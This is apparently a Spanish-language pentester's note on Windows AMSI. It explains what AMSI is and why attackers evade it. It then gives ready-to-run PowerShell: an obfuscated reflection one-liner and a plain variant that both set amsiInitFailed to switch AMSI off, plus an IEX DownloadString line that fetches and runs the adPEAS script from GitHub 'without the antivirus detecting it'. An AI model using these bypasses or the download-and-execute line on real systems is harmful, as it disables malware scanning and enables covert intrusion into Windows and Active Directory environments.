# AMSI

Tags: #AD #Windows #Powershell #AMSI #Evasion 

* [AMSI.fail](https://amsi.fail/)

AMSI (Antimalware Scan Interface) es una interfaz estándar desarrollada por Microsoft para que las soluciones antimalware de Windows puedan analizar contenido en busca de actividades maliciosas. Introducida con Windows 10, AMSI trabaja junto a otros componentes de seguridad, como Windows Defender, para ofrecer una capa adicional de protección.

De forma sencilla, AMSI permite que aplicaciones y servicios envíen contenido a un motor antimalware para ser evaluado antes de su ejecución, lo que resulta especialmente útil para analizar scripts en tiempo real. Es capaz de detectar y escanear scripts en lenguajes como PowerShell, VBScript o Ruby, incluso cuando están ofuscados.
## Por qué los ciberdelincuentes buscan evadir AMSI?

```bash 
AMSI (Antimalware Scan Interface) representa una barrera crítica para los atacantes debido a su capacidad para detectar comportamientos maliciosos en tiempo real, incluso antes de que el código se ejecute. Esto lo convierte en un objetivo prioritario para quienes intentan evadir la detección y garantizar el éxito de sus ataques, especialmente aquellos basados en scripts ofuscados o técnicas de ejecución en memoria.

- Detección en tiempo real: AMSI analiza el contenido justo antes de que se ejecute, bloqueando ataques antes de que se materialicen, lo que obliga a los ciberdelincuentes a evadir esta capa de seguridad para ejecutar su código malicioso.
    
- Análisis de scripts ofuscados: Aunque los atacantes ofuscan sus scripts para evitar las soluciones tradicionales, AMSI puede escanearlos tras ser desofuscados, cuando están en su forma original, lo que complica los intentos de ocultar intenciones maliciosas.
    
- Integración amplia: AMSI no se limita a analizar scripts; también puede escanear otros contenidos arbitrarios enviados por diversas aplicaciones y servicios, ampliando su alcance y reduciendo las posibilidades de éxito de un atacante.
    

Dada su eficacia, los ciberdelincuentes recurren a diversas técnicas para evadir AMSI, como:

- Cargar bibliotecas antiguas: Usar versiones anteriores de DLLs que no soporten AMSI para desactivar su funcionalidad.
- Manipulación de memoria: Alterar áreas de memoria relacionadas con AMSI para inutilizarlo.
- Ofuscación avanzada: Implementar métodos innovadores para intentar superar las capacidades de análisis de AMSI.
- Abusar de herramientas legítimas: Utilizar técnicas como _Living off the Land_ para ejecutar acciones maliciosas mediante herramientas legítimas que pueden eludir el escaneo o generar confianza.

La capacidad de AMSI para identificar amenazas en tiempo real lo convierte en un desafío constante para los atacantes, quienes buscan superarlo con técnicas cada vez más sofisticadas.
```

Los siguientes scripts los podemos ejecutar en la consola de  **Powershell**  antes de  ejecutar un comando que descargue un binario que detecte el antivirus como lo puede ser **adPeas**, etc... 

```powershell 
❯ $ExecutionContext.SessionState.LanguageMode    # Mirar los tipos de lenguaje 

	1. FullLanguage            # Acceso completo a todas las funcionalidades del lenguaje de Powershell
	2. RestrictedLanguage      # Solo permite un subconjunto del lenguaje de Powershell 
	3. ConstrainedLanguage     # Restringe el acceso a tipos .NET y a algunas capacidades del languaje 
	4. NoLanguage              # Lenguage completamente deshabilitado 
```

```powershell 
❯ Get-AppLockerPolicy -Effective 
❯ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
```

```powershell 
❯ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```powershell
# Ya no nos lo detectara el Antivirus 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adPEAS/main/adPEAS.ps1')
```

## Otra alternativa para el ByPass:

```Powershell 
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")
```